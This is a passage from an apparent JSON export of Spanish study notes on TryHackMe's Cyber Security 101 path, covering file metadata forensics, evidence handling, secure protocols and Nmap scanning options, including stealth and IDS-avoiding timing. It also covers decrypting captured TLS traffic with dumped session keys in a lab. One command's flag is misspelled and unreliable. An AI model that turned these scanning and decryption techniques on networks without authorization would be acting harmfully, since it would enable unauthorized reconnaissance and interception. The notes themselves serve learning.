595.32 x 841.92 pts (A4) \n\tPage rot:       0 \n\tFile size:      560362 bytes \n\tOptimized:      no \n\tPDF version:    1.7\n```\n\nLos metadatos muestran claramente que fue creado usando MS Word para Office 365 el 10 de Octubre de 2018.\n\n------------------------------------\n<h2>Datos EXIF de una foto</h2>\nEXIF significa Exchangeable Image File Format; es un estándar para guardar metadatos en imágenes. Cuando tomas una foto con tu teléfono móvil o tu cámara digital, mucha información se incrusta en la imagen. Algunos ejemplos de esos metadatos son:\n\n- Modelo de la cámara/móvil.\n- Fecha y hora de la captura de la imagen.\n- Configuraciones de fotografía como la distancia focal, apertura, velocidad de obturación e ISO.\n\nGracias a que los móviles están equipados con un sensor GPS, encontrar coordenadas GPS incrustadas en la imagen es altamente probable. Las coordenadas GPS como latitud y longitud mostrarían dónde fue tomada la foto.\n\nHay bastantes herramientas online y offline para leer datos EXIF de una imagen. Una de CLI es `exiftool`. Se usa para leer y escribir metadatos en varios tipos de archivos como imágenes JPEG. Si necesitas instalar esta herramienta: `sudo apt install libimage-exiftool-perl`. Veamos un ejemplo:\n\n```shell\nroot@tryhackme:~# exiftool IMAGE.jpg \n[...] \nGPS Position : 51 deg 31' 4.00\" N, 0 deg 5' 48.30'' W \n[...]\n```\n\nSi quieres buscar estas coordenadas en maps debes sustituir `deg` por `º`. `51 deg 30' 51.90\" N, 0 deg 5' 38.73\" W` -> `51°30'51.9\"N 0°05'38.7\"W`.\n\n-----------------------\n<h2>Challenge</h2>\n1. Investigamos con `pdfinfo` la carta de rescate para conocer al autor:\n   ![[Pasted image 20251020222909.png]]\n2. Con `exiftool` investigamos las coordenadas de la foto del secuestro:\n   ![[Pasted image 20251020223053.png]]\n   ![[Pasted image 20251020223327.png]]\n3. Así también podemos ver el modelo de la cámara, que aparece arriba."
  },
  {
    "title": "3. Evidence Acquisition",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/3-digital-forensics-fundamentals/3-evidence-acquisition/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/3. Digital Forensics Fundamentals/3. Evidence Acquisition.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security > 3. Digital Forensics Fundamentals",
    "content": "Adquirir evidencia es una tarea crítica. El quipo de forense debe recolectar toda la evidencia de manera segura sin interferir con la información original. Los métodos de adquisición de evidencia para dispositivos digitaless depende del tipo de dispositivo digital. Sin embargo, algunas prácticas generales deben seguirse mientras se adquiere la evidencia. Veamos algunos de los más importantes.\n\n---------------------------\n<h2>Autorización Debida</h2>\nEl qeuipo de forense debería obtener la autorización pertinente de las autoridades relevantes antes de recopilar cualquier información. La evidencia recolectada sin aprovación previa puede y será desestimada en la corte. La evidencia forénsica contiene información sensible y privada de una organización o individuo. Por esto la correcta y debida autorización es esencial y necesaria para poder investigar los dispositivos.\n\n------------------------------\n<h2>Cadena de Custodia</h2>\nImagina que un equipo de investigadores recolecta toda la evidencia de la escena de un crímen y alguna de las pruebas se extravía a los pocos días o hay algún cambio en la evidencia. Ningún individuo puede ser culpado porque no hay un proceso adecuado de documentación de duenños de evidencias. Este problema puede ser resuelto manteniendo un documento de cadena de custodia. Es un documento formal que contiene todos los detalles de la evidencia:\n\n- Descripción de la evidencia.\n- Nombre de los individuos que recolectaron la evidencia.\n- Día y hora de la recolección de la evidencia.\n- Lugar de almacenamiento de cada pieza de evidencia.\n- Horas de acceso e individuo que accede a la evidencia.\n\nEsto crea un debido rastreo de evidencia y ayuda a preservar las pruebas. Puede ser usado para probar la integridad y confianza de la evidencia presentada en la corte. Puedes ver un ejemplo de Chain of Custody en el archivo siguiente.\n\n-----------------------------\n<h2>Uso de Bloqueadores de Escritura</h2>\nLos bloqueadores de escritura son una parte esencialde la caja de herramientas del equipo de forénsica digital. Supón que estás recolectando evidencia del disco duro de un sospechoso. Mientras la recolección toma lugar, algunas tareas en el background pueden alterar los timestamps de los archivos en el hard drive. Esto puede conllevar a obstáculos en la investigación. Es por esto que se utilizan los write blockers."
  },
  {
    "title": "6. SFTP and FTPS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/6-sftp-and-ftps/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/6. SFTP and FTPS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "SFTP significa SSH File Transfer Protocol y permite la transferencia de archivos de manera segura. Es parte de la suite del protocolo SSH y comparte el mismo puerto, 22. Si está configurado de tal manera puedes conectarte con el comando `sftp <username>@<hostname>`. Una vez logueado, puedes usar comandos como `get <filename>` y `put <filename>` para descargar y subir archivos.\n\nSFTP no debe ser confundido con FTPS (File Transfer Protocol Secure)."
  },
  {
    "title": "3. HTTPS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/3-https/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/3. HTTPS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "<h2>HTTP</h2>\nComo hemos estudiado en la lección [[0. Networking Core Protocols]], HTTP necesita TCP y usa el puerto 80 por defecto. También vimos que todo el tráfico HTTP se manda en texto claro y cualquiera puede interceptarlo. \n\nRepasemos los pasos más comunes antes de que un buscador le pida a una página la información por HTTP:\n\n1. Establecer un three-way handshake TCP con el servidor de destino.\n2. Comunicarse usando el protocolo HTTP por ejemplo, `GET / HTTP/1.1`.\n\nEstos pasos se muestran en la imagen de abajo. Los tres paquetes del handshake TCP (marcados con un 1) preceden al primer paquete HTTP con `GET`. La comunicación está marcada con un 2. Los últimos 3 mensajes son la terminación de la comunicación y están marcados con un 3.\n\n![[87.png]]\n\n--------------------------\n<h2>HTTP sobre TLS</h2>\nHTTPS es Hypertext Transfer Protocol Secure. Es básicamente HTTP sobre TLS. Por ello, pedir a una página el HTTPS requerirá los siguientes pasos (después de resolver el nombre de dominio):\n\n1. Establecer un three-way handshake TCP con el servidor.\n2. Establecer una conexión TLS.\n3. Comunicarse usando el protocolo HTTP.\n\nLa foto de debajo muestra una conexión TCP establecida en los tres primeros paquetes, marcados con un 1. Después, varios paquetes son intercambiados para negociar el protocolo TLS, marcado con un 2. Los apartados 1 y 2 son donde las negociaciones y establecimiento TLS ocurren. Finalmente, la información de la aplicación HTTP se intercambia, marcado con un 3. Mirando Wireshark vemos que pone \"Application Data\" porque no hay manera de saber su es de hecho HTTP o algún otro protocolo mandado por el puerto 443.\n\n![[088.png]]\n\nSi intentamos ver lo que contienen los contenidos de los paquetes vemos algo del siguiente estilo sin tener la clave de encriptación:\n\n![[089.png]]\n\n------------------------\n<h2>Consiguiendo la Llave de Encriptación</h2>\nEs improbable que consigamos la clave, pero si lo hacemos, se la podemos dar a Wireshark para poder ver los paquetes de forma normal. Aquí un ejemplo de cómo se ven las comunicaciones encriptadas de arriba una vez tenemos la llave:\n\n![[090.png]]\n\n![[091.png]]\n"
  },
  {
    "title": "5. SSH",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/5-ssh/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/5. SSH.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "Hemos usado el protocolo telnet en la primera lección de esta unidad. Aunque es conveniente para loguearse y administrar sistemas, es arriesgado cuando todo el tráfico se manda en texto claro. En 1995, Tatu Ylönen desarrolló Secure Shell (SSH) y lo lanzó de manera abierta. Una versión más segura fue lanzada en 1996 (SSH-2). Hoy en día, al usar SSH, lo más probable es que estés usando OpenSSH, una implementación de código abierto de SSH hecha por los desarrolladores de OpenBSD. \n\nOpenSSH ofrece algunos beneficios. Veamos los puntos clave:\n\n- **Autentificación segura:** A parte de la autentificación basada en contraseña, soporta public key y autentificación en dos factores.\n- **Confidencialidad:** Otorga encriptación end-to-end, protegiendo ante espionaje. Además te notifica de nuevas claves de servidor para proteger contra ataque MITM (Man In The Middle).\n- **Integridad:** Además de proteger la confidencialidad, protege y asegura la integridad de la información (no modificaciones).\n- **Tunneling:** SSH puede crear un \"túnel\" seguro para routear otros protocolos a través de SSH. Esto conlleva un set-up parecido a la VPN.\n- **Redireccionamiento X11:** Permite usar interfaz gráfica a través de la red si te conectas a un sistema UNIX.\n\nUsaríamos el comando `ssh <username>@<hostname>` para conectarnos al servidor SSH. Si el nombre de usuario es el mismo que tu nombre actual, sólo necesitas `ssh hostname`. Entonces, se te pedirá la contraseña. De todas formas, si la autentificación de llave pública es usada, serás logueado automáticamente.\n\nLa imagen de abajo muestra un ejemplo ejecutando Wireshark en un sistema Kali Linux remoto. El argumento `-X` sirve para permitir interfaces gráficas, por ejemplo: `ssh 192.168.124.148 -X`. El sistema local necesita tener un sistema gráfico válido para que funcione.\n\n![[092.png]]\n\nMientras que telnet escucha en el puerto 23, SSH lo hace en el 22."
  },
  {
    "title": "2. TLS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/2-tls/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/2. TLS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "En un momento del pasado sólo necesitabas una herramienta de lectura de paquetes para leer chats, emails y credenciales. Era habitual que los atacantes pusieran sus tarjetas de red en modo promiscuo y revisaran después el log para encontrar credenciales. No había nada que pudieras hacer como usuario para protegerte.\n\nA principios de los 90, Netscape Communications reconoció la necesidad de la comunicación securizada. Desarrollaron SSL (Secure Sockets Layer) y lanzaron SSL 2.0 en 1995. En 1999, IETF (Internet Engineering Task Force desarrolló TLS). Aunque era similar, TLS 1.0 era un avance respecto a SSL 3.0.\n\nComo SSL, su predecesor, TLS es un protocolo criptográfico que opera en la capa de transporte del modelo OSI. Permite comunicaciones seguras entre servidor y cliente. Hoy en día la mayoría de protocolos han recibido mejoras de seguridad con la adición de TLS.\n\n-----------------------\n<h2>Bagaje técnico</h2>\nEl primer paso para cualquier servidor o cliente es identificarse para obtener un certificado TLS firmado. Generalmente, el administrador del servidor crea un CSR (Certificate Signing Request) y lo sube a la CA (Certificate Authority). Esta verifica el CSR y comanda un certificado digital. Una vez el certificado firmado es recibido, puede ser usado para identificar el servidor o el cliente al resto.\n\nPor norma general, tener un certificado implica pagar una tasa anual, pero [Let's Encrypt](https://letsencrypt.org/) te permite tener tu certificado de forma gratuita.\n\nUn Self-Signed Certificate es otro tipo de certificado que puedes hacer pero no autentifica nada ante terceros partidos, por no ser una firma reconocida."
  },
  {
    "title": "8. Closing notes + Challenge",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/8-closing-notes-challenge/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/8. Closing notes + Challenge.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "En esta lección hemos cubierto el uso de TLS, el cual provee de una capa de seguridad a protocolos como HTTP, SMTP, POP3 e IMAP. Además hemos visto lo que es SSH y cómo usarlo a nivel básico y las VPNs de manera superficial.\n\n------------------\n<h2>Challenge</h2>\nAl ejecutar `chromium --ssl-hey-log-file=~/ssl-key.log` dumpeamos las claves TLS al archivo `ssl-key.log`. El archivo de captura que analizaremos es `randy-chromium.pcapng` en la carpeta `Documents`. Al abrir `Wireshark` podemos configurarlo para usar `ssl-key.log`.\n\nPara hacerlo seguimos los pasos:\n\n1. Elegimos `Protocol Preferences`.\n2. Seleccionamos `Transport Layer Security`.\n3. Clickamos en `Open Transport Layer Security preferences`.\n4. Le damos a `Browse` y buscamos el documento que contiene las claves TLS.\n\nUna vez allí podemos filtrar con `http2.headers.method == \"POST\"`. Esto nos lleva al paquete 365. Si seguimos el flujo caemos en el paquete 366, de tipo xml-urlencoded-form. Si desencriptamos el paquete encontramos la flag."
  },
  {
    "title": "4. SMPTS, POP3S and IMAPS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/4-smpts-pop3s-and-imaps/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/4. SMPTS, POP3S and IMAPS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "Añadir TLS a SMTP, POP3 e IMAP no es diferente de añadírselo a HTTP. Casi todos los puntos que hemos visto para HTTPS aplican para SMTPS, POP3S e IMAPS.\n\nAquí una tabla con protocolos y puertos:\n\n| Protocolo | Puerto por defecto |\n| --------- | ------------------ |\n| HTTP      | 80                 |\n| SMTP      | 25                 |\n| POP3      | 110                |\n| IMAP      | 143                |\n\n| Protocolo | Puerto por defecto |\n| --------- | ------------------ |\n| HTTPS     | 443                |\n| SMTPS     | 465 and 587        |\n| POP3S     | 995                |\n| IMAPS     | 993                |\n\n"
  },
  {
    "title": "0. Networking Secure Protocols",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/0-networking-secure-protocols/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/0. Networking Secure Protocols.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/1. Introduction]]\n[[2. TLS]]\n[[3. HTTPS]]\n[[4. SMPTS, POP3S and IMAPS]]\n[[THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/5. SSH]]\n[[6. SFTP and FTPS]]\n[[7. VPN]]\n[[8. Closing notes + Challenge]]\n"
  },
  {
    "title": "7. VPN",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/7-vpn/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/7. VPN.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "Considera una compañía con oficinas en diferentes localizaciones. Estas deben poder conectarse a la rama principal con dispositivos diferentes. La solución más económica es crear una VPN (Virtual Private Network).\n\nCuando se diseñó Internet, TCP se centraba en repartir paquetes. Si un paquete no era recibido (ACK), TCP tenía incorporados mecanismos para detectarlo y reenviarlo. Pero no tenía mecanismos para asegurarse de que toda la información saliente era protegida y permanecía inalterable. La VPN fue la solución.\n\nTodas las compañías requieren de intercambio privado de información. Los requisitos indispensables son conexión a Internet, un servidor VPN y un cliente.\n\nEl diagrama de red de abajo muestra cómo una compañía con dos ramas remotas se conectan a la rama principal. Un cliente VPN se conectará al servidor VPN en la rama principal. En este caso, el cliente VPN encriptará el tráfico y lo pasará a esta por el túnel VPN (azul). El tráfico VPN se limita a las lineas azules, las verdes llevan el tráfico desencriptado.\n\n![[093 1.png]]\n\nEn el diagrama de abajo vemos cómo dos clientes se conectan a la rama principal usando la VPN:\n\n![[094 1.png]]\n\nUna vez que el túnel VPN está establecido, todo el tráfico de Internet será routeado a la conexión VPN. De esta manera, cuando intentamos acceder a un servicio de Internet, no veremos nuestra IP sino la del servidor VPN. Esto se puede utilizar para bypassear ciertas restricciones geográficas, pues si un usuario en España se conecta a una VPN japonesa, para los servidores receptores de sus peticiones web aparecerá como que está en Japón.\n\nDe todas formas, la VPN no siempre routea el tráfico, pues puede estar configurada para no hacerlo. Algunos países consideran usar una VPN ilegal y castigable. Comprueba las regulaciones locales antes de hacer nada."
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/4-networking-secure-protocols/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/4. Networking Secure Protocols/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 4. Networking Secure Protocols",
    "content": "En la lección anterior aprendimos sobre los protocolos usados para navegar por Internet y acceder a mail. Esto son geniales, pero no pueden proteger la confidencialidad, integridad o autenticidad de la información transmitida.\n\nTLS (Transport Layer Security) es añadido a los protocolos existentes de comunicaciones, transformando HTTP, POP3, SMTP e IMAP en HTTPS, POP3S, SMTPS e IMAPS siendo la S referente a \"Secure\".\n\n--------------------\n<h2>Pre-requisitos</h2>\nEsta lección es la última del grupo de cuatro formado por:\n\n- [[0. Networking Concepts]]\n- [[0. Networking Essentials]]\n- [[0. Networking Core Protocols]]\n- [[0. Networking Secure Protocols]]\n\n-------------------\n<h2>Objetivos de aprendizaje</h2>\n- SSL/TLS\n- Como securizar los protocolos de texto plano existentes como:\n\t- HTTP\n\t- SMTP\n\t- POP3\n\t- IMAP\n- Cómo SSH reemplazó a telnet\n- Cómo VPN crea una red segura"
  },
  {
    "title": "6. Output - Controlling What You See",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/7-nmap-the-basics/6-output-controlling-what-you-see/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/6. Output - Controlling What You See.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 7. Nmap - The Basics",
    "content": "Esta lección se centra en:\n\n- Mostrar información adicional mientras el escaneo ocurre.\n- Elegir el formato en el que se guarda el escaneo.\n\n---------------------\n<h2>Verbose y Debug</h2>\nEn algunos casos, el escaneo puede tomar mucho tiempo hasta que muestra resultados que podemos utilizar. Además puede que haya veces que estés interesado en información en tiempo real. La mejor manera de visualizar estos avances en el escaneo es usando `-v`, verbose. Este se puede incrementar con `-vv`, `-vvv` o `-vvvv`. También puedes especificar el nivel de verbose con `-v2` hasta `-v4`. Además puedes incrementar el nivel de verbose presionando \"v\" después de que el escaneo haya comenzado.\n\nSi todo este verbose no te satisface, puedes usar el output de debugging. Para ello introduce la opción `-d`. Puedes incrementar el nivel de debug de manera similar hasta `-d9`.\n\n-------------------\n<h2>Guardar Reportes de Escaneo</h2>\nEn muchos casos necesitaremos guardar los resultados de un escaneo. Nmap nos ofrece varios formatos para hacerlo. Los más útiles a nivel de lectura humana son el normal, XML y formato grepeable. Para hacerlo puedes añadir:\n\n- `-oN <file>`: Normal.\n- `-oX <file>`: XML.\n- `-oG <file>`: Grepeable (útil para `grep` y `awk`).\n- `-oA <file>`: En todos los formatos.\n\nAl usar `-oA` se generarán 3 archivos diferentes con extensiones:\n\n- `gnmap` (grepeable).\n- `nmap` (normal).\n- `xml` (xml).\n"
  },
  {
    "title": "0. Nmap - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/7-nmap-the-basics/0-nmap-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/0. Nmap - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 7. Nmap - The Basics",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/1. Introduction]]\n[[2. Host Discovery - Who is Online]]\n[[3. Port Scanning - Who is Listening]]\n[[4. Version Detection - Extract More Information]]\n[[5. Timing - How Fast is Fast]]\n[[6. Output - Controlling What You See]]\n[[7. Conclusion and Summary]]\n"
  },
  {
    "title": "5. Timing - How Fast is Fast",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/7-nmap-the-basics/5-timing-how-fast-is-fast/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/5. Timing - How Fast is Fast.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 7. Nmap - The Basics",
    "content": "Nmap ofrece varias opciones para controlar la rapidez del escaneo.\n\nEjecutar un escaneo de puertos a la velocidad predefinida puede disparar un IDS (Intrusion Detection System). Nmap nos ofrece 6 plantillas de velocidad:\n\n0. Paranoico.\n1. Furtivo.\n2. Educado.\n3. Normal.\n4. Agresivo.\n5. Insano.\n\nPodemos escoger por el número o por el nombre, `-T 0` o `-T paranoid`.\n\nA continuación una tabla en la que se lanza el mismo ataque a los 100 puertos más usuales con diferentes velocidades: `nmap -sS 10.10.216.1176 -F -T [opcion]`:\n\n| Timing          | Duración Total |\n| --------------- | -------------- |\n| T0 (paranoid)   | 9.8 horas      |\n| T1 (sneaky)     | 27.53 minutos  |\n| T2 (polite)     | 40.56 segundos |\n| T3 (normal)     | 0.15 segundos  |\n| T4 (aggressive) | 0.13 segundos  |\n\nEsto se debe al tiempo que espera Nmap entre puerto y puerto.\n\nOtra opción útil es la del número de pruebas paralelas (hilos). Este puede ser controlado con `--min-parallelism <numero_hilos>` y `--max-parallelism <numero_hilos>`. Por defecto, `namp` controlará automáticamente este número.\n\nOtra opción similar bastante útil es la de `--min-rate <número>` y `--max-rate <número>`. Este controla el número de peticiones que `nmap` realiza por segundo.\n\nLa última opción es la de `--host-timeout <tiempo>`. Esta opción especifica el máximo tiempo que estás dispuesto a esperar la respuesta a una petición.\n\n| Opción                                                              | Explicación                               |\n| ------------------------------------------------------------------- | ----------------------------------------- |\n| `-T<0-5>`                                                           | Plantilla de timing (0-5).                |\n| `--min-parallelism <numprobes>` and `--max-parallelism <numprobes>` | Mínimo y máximo de hilos.                 |\n| `--min-rate <number>` and `--max-rate <number>`                     | Mínimo y máximo de paquetes por segundo.  |\n| `--host-timeout`                                                    | Tiempo máximo de espera de una respuesta. |\n"
  },
  {
    "title": "4. Version Detection - Extract More Information",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/7-nmap-the-basics/4-version-detection-extract-more-information/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/4. Version Detection - Extract More Information.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 7. Nmap - The Basics",
    "content": "<h2>Detección de Sistema Operativo</h2>\nPuedes activar la detección de sistema operativo añadiendo la opción `-O`. Aunque el resultado suele ser fiable, es importante saber que no hay un detector de sistema operativo 100% eficaz.\n\n------------------\n<h2>Detección de Versiones de Servicios</h2>\nDescubriste varios puertos abiertos y quieres saber qué servicios se están ejecutando en ellos. Esto es muy conveniente a la hora de recopilar información. La opción `-A` activa la detección de SO, versión y traceroute.\n\n-------------\n<h2>Forzando el Escaneo</h2>\nCuando ejecutamos nuestro escaneo usando `-sS`, hay una posibilidad de que el objetivo no responda durante la fase de host discovery (por ejemplo no respondiendo a las peticiones ICMP). Consecuentemente, Nmap lo marcará como host inactivo y no lanzará escaneo de puertos contra él. Sin embargo podemos pedirle a Nmap que trate a todos los dispositivos en la red como activos. Para usar esta opción escribimos `-Pn`.\n\n<h2>Resumen</h2>\n\n| Opción | Explicación                                          |\n| ------ | ---------------------------------------------------- |\n| `-O`   | Detección de sistema operativo.                      |\n| `-sV`  | Detección de servicio y versión.                     |\n| `-A`   | Detección de sistema operativo, versión y más.       |\n| `-Pn`  | Escanea dispositivos que aparentan no estar activos. |"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/7-nmap-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 7. Nmap - The Basics",
    "content": "Imagina un escenario donde estás conectado a una red haciendo uso de varios recursos online (email, navegador, etc.). Dos preguntas salen:\n\n - ¿Cómo podemos descubrir otros dispositivos activos en la red?\n - ¿Cómo podemos encontrar servicios corriendo en la red en estos dispositivos (SSH, servidores web, etc.)?\n\nUn acercamiento es hacerlo de forma manual. Si nos piden detectar los dispositivos activos en `192.168.0.1/24`, deberíamos usar herramientas como `ping` o `arp-scan` para comprobar 254 direcciones. Estas herramientas tienen limitaciones pues `ping` no devolverá nada si el firewall está bloqueando el tráfico ICMP y `arp-scan` sólo funciona si nuestro dispositivo está conectado a la misma red. Lo mismo para descubrir puertos. Podríamos usar `telnet` pero consumiría muchísimo tiempo.\n\nUna solución muy eficiente es Nmap. Es una herramienta de código abierto que fue publicada en 1997. Es un escáner de red flexible y poderoso.\n\n-------------\n<h2>Objetivos de Aprendizaje</h2>\nEsta unidad intenta brindarte conocimientos básicos necesarios para usar `nmap`. Aprenderemos cómo:\n\n- Descubrir dispositivos activos.\n- Encontrar servicios activos en los dispositivos activos.\n- Distinguir los diferentes tipos de escaneos de puertos.\n- Detectar las versiones de los servicios activos.\n- Controlar el timing.\n- Formatear la salida.\n\n<h2>Pre-requisitos</h2>\nDeberías estar familiarizado con el modelo TCP/IP, los conceptos relacionados y sus protocolos.\n\n- [[0. Networking Concepts]]\n- [[0. Networking Essentials]]\n- [[0. Networking Core Protocols]]\n- [[0. Networking Secure Protocols]]\n"
  },
  {
    "title": "7. Conclusion and Summary",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/7-nmap-the-basics/7-conclusion-and-summary/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/7. Conclusion and Summary.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 7. Nmap - The Basics",
    "content": "Hemos aprendido los básicos de Nmap. Recuerda que es mejor ejecutarlo con `sudo` para poder aprovechar todas sus funcionalidades. A continuación una tabla de ayuda:\n\n| Opción                                                              | Explicación                                        |\n| ------------------------------------------------------------------- | -------------------------------------------------- |\n| `-sL`                                                               | Lista los objetivos sin escanearlos.               |\n| **_Host Discovery_**                                                |                                                    |\n| `-sn`                                                               | Escaneo de ping, sólo para descubrir dispositivos. |\n| **_Port Scanning_**                                                 |                                                    |\n| `-sT`                                                               | Escaneo de conexión (handshake).                   |\n| `-sS`                                                               | Escaneo sigiloso (primer paso sólo).               |\n| `-sU`                                                               | Escaneo UDP.                                       |\n| `-F`                                                                | Modo rápido (100 puertos).                         |\n| `-p[range]`                                                         | Especifica un rango de puertos.                    |\n| `-Pn`                                                               | Trata todos los dispositivos como activos.         |\n| **_Service Detection_**                                             |                                                    |\n| `-O`                                                                | Detección de Sistema Operativo.                    |\n| `-sV`                                                               | Detección de versión de servicio.                  |\n| `-A`                                                                | Detección de SO, versión y más.                    |\n| **_Timing_**                                                        |                                                    |\n| `-T<0-5>`                                                           | Plantilla de timing (0-5)                          |\n| `--min-parallelism <numprobes>` and `--max-parallelism <numprobes>` | Número de hilos.                                   |\n| `--min-rate <number>` and `--max-rate <number>`                     | Número de paquetes por segundo.                    |\n| `--host-timeout`                                                    | Tiempo máximo de respuesta.                        |\n| **_Real-time output_**                                              |                                                    |\n| `-v`                                                                | Nivel de verbose (1-4).                            |\n| `-d`                                                                | Nivel de debug (1-9).                              |\n| **_Report_**                                                        |                                                    |\n| `-oN <filename>`                                                    | Salida normal.                                     |\n| `-oX <filename>`                                                    | Salida XML.                                        |\n| `-oG <filename>`                                                    | Salida grepeable.                                  |\n| `-oA <basename>`                                                    | Salida en todos los formatos.                      |\n"
  },
  {
    "title": "2. Host Discovery - Who is Online",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/7-nmap-the-basics/2-host-discovery-who-is-online/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/7. Nmap - The Basics/2. Host Discovery - Who is Online.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 7. Nmap - The Basics",
    "content": "Esta lección se centra en cómo usar `namp` para descubrir dispositivos activos. Nmap usa varios métodos sofisticados para descubrirlos.\n\nAntes de empezar, debemos mencionar que Nmap usa múltiple métodos para especificar sus objetivos:\n\n- Rango IP: Usando `-`, si queremos escanear las direcciones IP desde `192.168.0.1` hasta `192.168.0.10`, podemos escribir `192.168.0.1-10`.\n- Submáscara de red: Usando `/`, si queremos buscar en el rango `192.168.0.0-255` es lo mismo que escribir `192.168.0.1/24`.\n- Hostname: Podemos especificar el nombre de dominio en lugar de la IP con `example.com`.\n\nDigamos que queremos averiguar los dispositivos activos en una red. Nmap tiene la opción `-sn`. \n\nAntes de comenzar, deberíamos anotar que a lo largo de esta unidad usaremos `nmap` como `root` (con `sudo`). Esto es porque no queremos restringir las habilidades de `nmap`.\n\n------------\n<h2>Escaneando una Red Local</h2>\nEn este contexto, usamos el término local para referirnos a la red a la que nosotros mismos estamos conectados. Por estar conectados a dicha red podemos ver las direcciones MAC de los dispositivos. Cuando se escanea la red a la que estamos conectados, Nmap empieza mandando peticiones ARP y cuando un dispositivo responde a esta se le califica como activo.\n\n---------------\n<h2>Escaneando una Red Remota</h2>\nEn este contexto, remoto significa que al menos un router nos separa de esa red. Por esto no podemos mandar peticiones ARP. Nmap no se ve afectado por las limitaciones de `arp-scan` y puede averiguar los dispositivos activos en una red remota igualmente. Veamos cómo lo hace:\n\n- `192.168.11.1` está activa y respondió al paquete ICMP echo (ping).\n- `192.168.11.2` parece inactiva, nmap mandó dos paquetes ICMP echo, dos paquetes TCP con la flag SYN establecida y dos paquetes al 